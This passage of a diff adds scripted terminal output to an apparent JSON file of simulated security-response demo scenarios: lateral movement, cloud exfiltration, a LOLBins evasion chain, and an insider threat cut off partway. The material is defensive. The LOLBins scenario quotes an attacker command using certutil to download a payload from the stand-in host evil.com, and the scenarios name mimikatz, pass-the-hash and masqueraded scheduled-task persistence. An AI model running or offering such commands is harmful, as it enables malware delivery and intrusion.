+        "text": "[BODY]   \u251c\u2500 RDP tunnel: port 3389 forwarded over SSH (unusual)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Pass-the-hash: NTLM auth without prior password entry",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 SMB file transfer: C:\\tools\\mimikatz.exe \u2192 target host",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u2514\u2500 4 lateral hops in 180 seconds (WKS\u2192SRV\u2192DC\u2192BACKUP)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] risk_score = HIGH | lateral_hops = 4",
+        "type": "error"
+      },
+      {
+        "text": "[BODY] Forwarding to The Brain for analysis...",
+        "type": "info"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 2: THE BRAIN \u2014 AI Threat Analysis \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "brain",
+        "phase": 2
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BRAIN] Receiving detection BODY-LATMOV-RDP-c8f1a3...",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Loading governance: ai_governance_baseline.yaml",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 NTLM-only auth: pass-the-hash confirmed (no Kerberos TGT)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Tool transfer: mimikatz.exe SHA256 matches known hash",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Lateral path: dev workstation \u2192 file server \u2192 DC \u2192 backup",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u2514\u2500 Behavior: account svc_backup never used RDP before",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Confidence: 87% \u2192 95% (PtH + lateral path + tool transfer)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Recommended playbook: lateral-movement-containment v1.0.0",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Decision: APPROVE execution",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 3: THE PURPOSE \u2014 CLAW Playbook Execution \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "purpose",
+        "phase": 3
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[CLAW] Loading: lateral-movement-containment v1.0.0",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] Step 1/3: block_rdp_lateral",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: EDGE | action: block RDP from source subnet",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 RDP blocked: 10.1.5.0/24 \u2192 10.1.10.0/24",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 2/3: revoke_ntlm_sessions",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: BODY | action: invalidate NTLM hashes",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 NTLM sessions invalidated for svc_backup",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 3/3: segment_network",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: EDGE | action: micro-segment affected subnet",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Micro-segmentation applied to 10.1.5.0/24",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 4: THE EDGE \u2014 Enforcement \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "edge",
+        "phase": 4
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[EDGE] Enforcing network segmentation...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] HMAC-SHA256 signature: VERIFIED \u2713",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 Firewall rule: DENY RDP 10.1.5.0/24 \u2192 10.1.10.0/24 \u2713",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 Micro-segment: VLAN isolation applied \u2713 (8ms)",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u2514\u2500 NTLM relay: SMB signing enforced org-wide \u2713",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   \u2713 SIMULATION COMPLETE                                    \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   Lateral movement blocked in 4.1s | 4 hops contained      \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "success"
+      },
+      {
+        "text": "[SYSTEM] Lab safety policy enforced: SIMULATE mode active.",
+        "type": "system"
+      }
+    ],
+    "graph_states": {
+      "body_active": "Detecting RDP anomaly...",
+      "body_done": "Lateral Movement Found",
+      "brain_active": "Analyzing lateral path...",
+      "brain_done": "Decision: APPROVE",
+      "purpose_active": "Blocking RDP + NTLM...",
+      "purpose_done": "Network Segmented",
+      "edge_active": "Enforcing isolation...",
+      "edge_done": "Movement Contained"
+    },
+    "success_metrics": "Time to Contain: 4.1s | Lateral Hops Blocked: 4 | NTLM Sessions Revoked: 1 | Segments Isolated: 1"
+  },
+  "pkg-009": {
+    "id": "pkg-009",
+    "pkg_id": "pkg-009",
+    "title": "DarkVault Data Exfiltration",
+    "subtitle": "Data staging \u2192 archive compression \u2192 exfiltration over cloud storage service",
+    "terminal_steps": [
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   SCENARIO: DARKVAULT DATA EXFILTRATION \u2014 pkg-009           \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   Data Staging \u2192 Archive \u2192 Exfiltration via Cloud Storage   \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "header"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[SYSTEM] Loading scenario: DarkVault Data Exfiltration",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Threat actor profile: DARKVAULT (Data Theft Operator)",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] MITRE ATT&CK: T1560, T1041, T1567",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Signals: DLP, Network flows, Cloud storage audit",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Lab safety: SIMULATE mode | Synthetic data files",
+        "type": "system"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 1: THE BODY \u2014 DLP & Network Telemetry \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "body",
+        "phase": 1
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BODY] DLP alert: Large archive creation on SRV-DB-03",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] File: C:\\staging\\export_20260316.7z (2.4 GB, password-protected)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] \u26a1 Detection triggered: BODY-EXFIL-STAGE-d9a4b7",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Archive created: 2.4 GB from 14,000 database records",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Sensitivity: CONFIDENTIAL labels detected in payload",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Outbound: 2.4 GB upload to mega.nz (unauthorized service)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u2514\u2500 Transfer rate: 45 MB/s sustained (abnormal for user)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] risk_score = CRITICAL | data_volume = 2.4 GB | labels = CONFIDENTIAL",
+        "type": "error"
+      },
+      {
+        "text": "[BODY] Forwarding to The Brain for analysis...",
+        "type": "info"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 2: THE BRAIN \u2014 AI Threat Analysis \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "brain",
+        "phase": 2
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BRAIN] Receiving detection BODY-EXFIL-STAGE-d9a4b7...",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Decision authority: CRITICAL \u2192 brain_oversight REQUIRED",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Staging: password-protected 7z (anti-forensic technique)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Destination: mega.nz (not on approved cloud services)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Volume: 2.4 GB exceeds user's 30-day average (47 MB)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u2514\u2500 Time: 02:47 UTC (outside user's normal working hours)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Confidence: 92% \u2192 98% (volume + destination + time anomaly)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Recommended playbook: data-exfiltration-containment v1.0.0",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Decision: APPROVE execution",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 3: THE PURPOSE \u2014 CLAW Playbook Execution \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "purpose",
+        "phase": 3
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[CLAW] Loading: data-exfiltration-containment v1.0.0",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] Step 1/3: block_exfil_channel",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: EDGE | action: block outbound to mega.nz",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Outbound blocked: mega.nz (*.mega.nz, *.mega.co.nz)",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 2/3: quarantine_staging_host",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: EDGE | action: network isolate SRV-DB-03",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 SRV-DB-03 isolated (forensic access only)",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 3/3: escalate_to_ciso",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: INTERNAL | action: CISO escalation with evidence",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Breach assessment package sent to CISO",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 4: THE EDGE \u2014 Enforcement \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "edge",
+        "phase": 4
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[EDGE] Enforcing exfiltration block...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] HMAC-SHA256 signature: VERIFIED \u2713",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 DNS: mega.nz sinkholed across all resolvers \u2713",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 Firewall: SRV-DB-03 isolated to forensic VLAN \u2713 (4ms)",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u2514\u2500 DLP: Enhanced monitoring on all DB servers \u2713",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   \u2713 SIMULATION COMPLETE                                    \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   Exfiltration blocked in 2.8s | 2.4 GB data preserved     \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "success"
+      },
+      {
+        "text": "[SYSTEM] Lab safety policy enforced: SIMULATE mode active.",
+        "type": "system"
+      }
+    ],
+    "graph_states": {
+      "body_active": "Detecting data staging...",
+      "body_done": "Exfiltration Detected",
+      "brain_active": "Analyzing data flow...",
+      "brain_done": "Decision: APPROVE",
+      "purpose_active": "Blocking exfil...",
+      "purpose_done": "Host Quarantined",
+      "edge_active": "Isolating server...",
+      "edge_done": "Exfil Blocked"
+    },
+    "success_metrics": "Time to Block: 2.8s | Data Preserved: 2.4 GB | Host Isolated: SRV-DB-03 | CISO Notified: Yes"
+  },
+  "pkg-010": {
+    "id": "pkg-010",
+    "pkg_id": "pkg-010",
+    "title": "GhostBin LOLBins Evasion Chain",
+    "subtitle": "Certutil download \u2192 mshta execution \u2192 PowerShell payload \u2192 persistence via scheduled task",
+    "terminal_steps": [
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   SCENARIO: GHOSTBIN LOLBINS EVASION \u2014 pkg-010              \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   Certutil \u2192 Mshta \u2192 PowerShell \u2192 Scheduled Task Persist   \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "header"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[SYSTEM] Loading scenario: GhostBin LOLBins Evasion Chain",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Threat actor profile: GHOSTBIN (Evasion Specialist)",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] MITRE ATT&CK: T1218, T1059.001, T1036",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Signals: Sysmon, PowerShell logs, Process creation",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Lab safety: SIMULATE mode | Sandboxed execution",
+        "type": "system"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 1: THE BODY \u2014 Endpoint Telemetry \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "body",
+        "phase": 1
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BODY] Sysmon EventID 1: Process creation \u2014 certutil.exe",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] CommandLine: certutil -urlcache -split -f http://evil.com/payload.b64 C:\\temp\\p.b64",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] \u26a1 Detection triggered: BODY-LOLBIN-CHAIN-e5c2f8",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 certutil.exe: -urlcache download from external URL",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 mshta.exe: javascript:eval() execution (child of certutil)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 powershell.exe: -EncodedCommand with base64 payload",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 schtasks.exe: /create /tn \"WindowsUpdate\" persistence",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u2514\u2500 Process tree: certutil \u2192 mshta \u2192 powershell \u2192 schtasks",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] risk_score = MEDIUM | lolbin_chain_depth = 4",
+        "type": "error"
+      },
+      {
+        "text": "[BODY] Forwarding to The Brain for analysis...",
+        "type": "info"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 2: THE BRAIN \u2014 AI Threat Analysis \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "brain",
+        "phase": 2
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BRAIN] Receiving detection BODY-LOLBIN-CHAIN-e5c2f8...",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Loading governance: ai_governance_baseline.yaml",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 certutil download: known LOLBin abuse pattern",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 mshta eval: scriptlet execution (T1218.005)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 PowerShell: encoded command (obfuscation indicator)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u2514\u2500 Scheduled task: masquerading as WindowsUpdate",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Confidence: 85% \u2192 93% (4-binary chain + masquerading)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Recommended playbook: lolbins-containment-response v1.0.0",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Decision: APPROVE execution",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 3: THE PURPOSE \u2014 CLAW Playbook Execution \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "purpose",
+        "phase": 3
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[CLAW] Loading: lolbins-containment-response v1.0.0",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] Step 1/3: terminate_lolbin_process",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: BODY | action: terminate process tree",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Process tree terminated (PID 4872 + children)",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 2/3: collect_execution_artifacts",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: INTERNAL | action: collect prefetch + shimcache",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Forensic artifacts collected (4 prefetch, 12 shimcache)",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 3/3: apply_applocker_policy",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: EDGE | action: enforce AppLocker for LOLBins",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 AppLocker: certutil, mshta restricted to admin only",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 4: THE EDGE \u2014 Enforcement \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "edge",
+        "phase": 4
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[EDGE] Enforcing application control...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] HMAC-SHA256 signature: VERIFIED \u2713",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 AppLocker: certutil.exe restricted \u2713",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 AppLocker: mshta.exe restricted \u2713",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u2514\u2500 Scheduled task \"WindowsUpdate\" removed \u2713",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   \u2713 SIMULATION COMPLETE                                    \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   LOLBin chain terminated in 3.6s | Persistence removed    \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "success"
+      },
+      {
+        "text": "[SYSTEM] Lab safety policy enforced: SIMULATE mode active.",
+        "type": "system"
+      }
+    ],
+    "graph_states": {
+      "body_active": "Detecting LOLBin abuse...",
+      "body_done": "Chain Identified",
+      "brain_active": "Analyzing process tree...",
+      "brain_done": "Decision: APPROVE",
+      "purpose_active": "Terminating + Collecting...",
+      "purpose_done": "AppLocker Applied",
+      "edge_active": "Enforcing restrictions...",
+      "edge_done": "LOLBins Blocked"
+    },
+    "success_metrics": "Time to Terminate: 3.6s | Processes Killed: 4 | Artifacts Collected: 16 | Persistence Removed: 1"
+  },
+  "pkg-011": {
+    "id": "pkg-011",
+    "pkg_id": "pkg-011",
+    "title": "Midnight Raven Insider Threat",
+    "subtitle": "Anomalous access \u2192 bulk data download \u2192 off-hours exfiltration attempt",
+    "terminal_steps": [
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   SCENARIO: MIDNIGHT RAVEN INSIDER THREAT \u2014 pkg-011         \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   Anomalous Access \u2192 Bulk Download \u2192 Off-Hours Exfil        \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "header"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[SYSTEM] Loading scenario: Midnight Raven Insider Threat",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Threat actor profile: INSIDER (Disgruntled Employee)",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] MITRE ATT&CK: T1078, T1530, T1213",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Signals: UEBA, HR feed, DLP, Badge access",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Lab safety: SIMULATE mode | Synthetic behavior data",
+        "type": "system"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 1: THE BODY \u2014 Behavioral Telemetry \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "body",
+        "phase": 1
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BODY] UEBA alert: Risk score spike for user r.martinez",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Current risk score: 92/100 (baseline: 15)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] \u26a1 Detection triggered: BODY-INSIDER-ANON-f2a7c4",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Access time: 02:15 UTC (user's normal: 08:00-18:00)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 SharePoint: 847 documents downloaded in 45 minutes",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Confluence: 23 restricted wiki pages exported to PDF",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Badge: no physical building entry today (remote VPN)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u2514\u2500 HR signal: resignation submitted 3 days ago",
+        "type": "body"
+      },
+      {
